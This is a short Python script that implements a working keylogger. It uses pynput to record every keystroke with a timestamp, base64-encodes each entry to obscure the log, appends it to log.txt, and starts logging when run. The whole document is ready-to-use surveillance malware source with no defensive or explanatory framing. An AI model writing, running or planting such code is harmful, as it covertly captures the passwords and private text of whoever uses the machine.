from pynput.keyboard import Listener
from datetime import datetime
import base64

def on_press(key):
    key_str = str(key).replace("'", "")
    if key_str == 'Key.enter':
        key_str = '\\n'
    elif key_str == 'Key.space':
        key_str = ' '
    elif key_str.startswith('Key.'):
        key_str = f'[{key_str}]'
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'[{timestamp}] {key_str}'
    with open('log.txt', 'a') as f:
        encoded_entry = base64.b64encode(log_entry.encode()).decode()
        f.write(f'{encoded_entry}\\n')

def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Example usage
keylogger()
